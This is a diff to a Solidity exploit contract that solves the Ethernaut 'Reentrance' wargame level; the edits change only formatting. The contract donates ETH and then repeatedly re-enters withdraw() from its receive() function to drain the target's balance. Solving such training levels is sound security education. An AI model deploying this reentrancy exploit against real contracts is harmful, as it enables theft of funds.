@@ -16,7 +16,7 @@ Tools needed for this level:
 // SPDX-License-Identifier: MsIT
 pragma solidity ^0.6.0;
 
-import './Reentrance.sol';
+import "./Reentrance.sol";
 
 contract RentranceAttack {
 	Reentrance reentrance;
@@ -32,7 +32,7 @@ contract RentranceAttack {
 		// donate any amount of ETH for being able to pass the first
 		// requirement of the withdraw function on Ethernaut's Reentrance:
 		//     if(balances[msg.sender] >= _amount)
-		reentrance.donate{value: amount}(address(this));
+		reentrance.donate{ value: amount }(address(this));
 
 		// Execute the withdraw function
 		reentrance.withdraw(amount);
@@ -42,8 +42,6 @@ contract RentranceAttack {
 	// withdraw() function on Reentrance contract as long as its balance is
 	// greater than zero.
 	receive() external payable {
-		if (address(reentrance).balance > 0) {
-			reentrance.withdraw(amount);
-		}
+		if (address(reentrance).balance > 0) reentrance.withdraw(amount);
 	}
 }
